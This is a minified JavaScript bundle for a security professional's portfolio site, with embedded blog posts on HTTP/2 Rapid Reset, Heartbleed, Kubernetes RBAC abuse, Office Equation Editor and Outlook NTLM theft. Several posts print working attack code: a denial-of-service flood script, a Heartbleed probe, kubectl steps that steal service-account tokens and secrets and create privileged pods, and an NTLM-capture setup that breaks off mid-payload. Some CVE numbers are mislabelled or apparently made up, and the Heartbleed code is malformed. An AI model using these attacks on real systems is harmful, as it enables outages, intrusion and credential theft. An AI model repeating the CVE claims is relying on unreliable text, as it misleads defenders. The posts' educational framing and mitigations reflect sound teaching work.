M.jsxs("div",{className:"featured-carousel",children:[M.jsxs("div",{className:"featured-card",children:[M.jsxs("div",{className:"featured-meta",children:[M.jsx("span",{className:"pill",children:"Featured"}),i.tag&&M.jsx("span",{className:"pill",children:i.tag})]}),M.jsx("h3",{children:i.title}),M.jsx("p",{children:i.description}),M.jsx("div",{className:"project-tags",children:(i.tags||[]).map(a=>M.jsx("span",{className:"pill",children:a},a))}),M.jsx("div",{className:"featured-actions",children:M.jsx("a",{href:i.href,target:"_blank",rel:"noreferrer",className:"link-button",children:"View"})})]}),t.length>1&&M.jsxs("div",{className:"featured-controls",children:[M.jsx("button",{type:"button",onClick:r,className:"button ghost","aria-label":"Previous",children:"←"}),M.jsx("button",{type:"button",onClick:s,className:"button ghost","aria-label":"Next",children:"→"})]})]})}function C0({items:t=[],showViewAll:e=!1,showHeader:n=!0,showFilters:i,showFeatured:s,wrap:r=!0}){const[a,o]=ee.useState("All"),[l,c]=ee.useState(1),d=4,p=t.slice(0,2),h=ee.useMemo(()=>new Set(p.map(T=>T.title)),[p]),f=i??n,_=(s??n)&&a==="All",y=ee.useMemo(()=>a==="All"?t:t.filter(T=>{var A;return(A=T.tags)==null?void 0:A.some(R=>R.toLowerCase().includes(a.toLowerCase().split(" ")[0]))}),[a,t]),m=_?y.filter(T=>!h.has(T.title)):y,u=Math.max(1,Math.ceil(m.length/d)),g=m.slice((l-1)*d,l*d),x=T=>{o(T),c(1)},S=M.jsxs(M.Fragment,{children:[n&&M.jsxs("div",{className:"section-header",children:[M.jsxs("div",{children:[M.jsx("h2",{className:"section-title",children:"Projects"}),M.jsx("p",{className:"section-subtitle",children:"Deployment dossier — hardened builds and offensive prototypes."})]}),e&&M.jsx("div",{className:"section-actions",children:M.jsx(zt,{className:"link-button",to:"/projects",children:"View all projects"})})]}),f&&M.jsx(fb,{activeFilter:a,onFilterChange:x}),_&&M.jsx(mb,{items:p}),M.jsx("div",{className:"projects-list",children:g.map(T=>{var A;return M.jsxs("div",{className:"project-row",children:[M.jsxs("div",{className:"project-row-body",children:[M.jsx("a",{href:T.href,target:"_blank",rel:"noreferrer",className:"project-title-link",children:M.jsx("h5",{className:"project-title",children:T.title})}),M.jsx("p",{className:"project-description",children:T.description}),(A=T.tags)!=null&&A.length?M.jsx("div",{className:"project-tags",children:T.tags.map(R=>M.jsx("span",{className:"pill",children:R},R))}):null]}),M.jsx("div",{className:"project-row-cta",children:M.jsx("a",{href:T.href,target:"_blank",rel:"noreferrer",className:"view-credentials",children:"View"})})]},T.title)})}),u>1&&M.jsxs("div",{className:"blog-pagination project-pagination",children:[M.jsx("button",{className:"pill",disabled:l===1,onClick:()=>c(Math.max(1,l-1)),type:"button",children:"Previous"}),M.jsxs("span",{className:"blog-page-indicator",children:["Page ",l," of ",u]}),M.jsx("button",{className:"pill",disabled:l===u,onClick:()=>c(Math.min(u,l+1)),type:"button",children:"Next"})]})]});return r?M.jsx("section",{className:"section projects",id:"projects",children:M.jsx("div",{className:"container",children:S})}):M.jsx("div",{className:"projects",children:S})}function Yf(){const t=rb,e=Ga.slice(0,3);return M.jsxs(M.Fragment,{children:[M.jsx(pb,{data:sb}),M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container intro-grid",children:[M.jsxs("div",{className:"intro-title",children:[M.jsx("div",{className:"eyebrow",children:"****"}),M.jsx("h2",{className:"section-title",children:"With precision + curiosity, we harden systems."})]}),M.jsxs("div",{className:"intro-body",children:[M.jsx("p",{className:"lead",children:qf.text}),M.jsx("p",{children:"Every environment tells a story. I help teams surface weak links, stage realistic tests, and ship defenses that hold under pressure."}),M.jsx("div",{className:"hero-meta",children:fd.map(n=>M.jsx("a",{href:n.href,target:"_blank",rel:"noreferrer",className:"pill",children:n.label},n.href))})]})]})}),M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsx("div",{className:"section-header",children:M.jsx("h2",{className:"section-title",children:"Experience"})}),M.jsx("div",{className:"logo-grid",children:t.map(n=>M.jsxs("div",{className:"logo-card",children:[M.jsx("div",{className:"logo-role",children:n.role}),M.jsx("div",{className:"logo-org",children:n.org}),M.jsx("div",{className:"logo-range",children:n.range})]},`${n.org}-${n.role}`))})]})}),M.jsx(cb,{data:qf,socials:fd}),M.jsx(C0,{items:w0,showViewAll:!0,showHeader:!0,showFilters:!1}),M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsxs("div",{className:"section-header",children:[M.jsxs("div",{children:[M.jsx("h2",{className:"section-title",children:"Recognitions"}),M.jsx("p",{className:"section-subtitle",children:"Certifications and credentials earned across security and cloud."})]}),M.jsx("div",{className:"section-actions",children:M.jsx(zt,{className:"link-button",to:"/certifications",children:"View all certifications"})})]}),M.jsx(A0,{items:M0.slice(0,5),showHeader:!1,wrap:!1})]})}),M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsxs("div",{className:"section-header",children:[M.jsxs("div",{children:[M.jsx("h2",{className:"section-title",children:"Ops Log"}),M.jsx("p",{className:"section-subtitle",children:"Recent writeups from exploit labs and defensive research."})]}),M.jsx("div",{className:"section-actions",children:M.jsx(zt,{className:"link-button",to:"/blogs",children:"View all posts"})})]}),M.jsx(T0,{posts:e,wrap:!1})]})})]})}function gb({data:t}){return M.jsx("header",{className:"blog-welcome-section",children:M.jsxs("div",{className:"container",children:[M.jsx("div",{className:"eyebrow",children:"Ops log"}),M.jsx("h1",{children:t.title}),M.jsx("p",{className:"lead",children:t.subtitle})]})})}function vb({posts:t=[],onFilter:e}){const[n,i]=ee.useState(""),s=ee.useMemo(()=>n.trim()?t.filter(a=>a.title.toLowerCase().includes(n.toLowerCase())||a.excerpt.toLowerCase().includes(n.toLowerCase())):t,[n,t]);ee.useEffect(()=>{e==null||e(s)},[s,e]);const r=a=>{i(a.target.value)};return M.jsxs("div",{className:"blog-search",children:[M.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),M.jsxs("div",{className:"search-shell",children:[M.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),M.jsx("input",{id:"blog-search",type:"search",value:n,onChange:r,placeholder:"Type a keyword…",className:"search-input"})]})]})}function _b(){const[t,e]=ee.useState(Ga);return M.jsxs(M.Fragment,{children:[M.jsx(gb,{data:ab}),M.jsx("section",{className:"section",children:M.jsxs("div",{className:"container",children:[M.jsx(vb,{posts:Ga,onFilter:e}),M.jsx(T0,{posts:t,wrap:!1})]})})]})}const xb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,yb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Sb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,bb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,wb=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
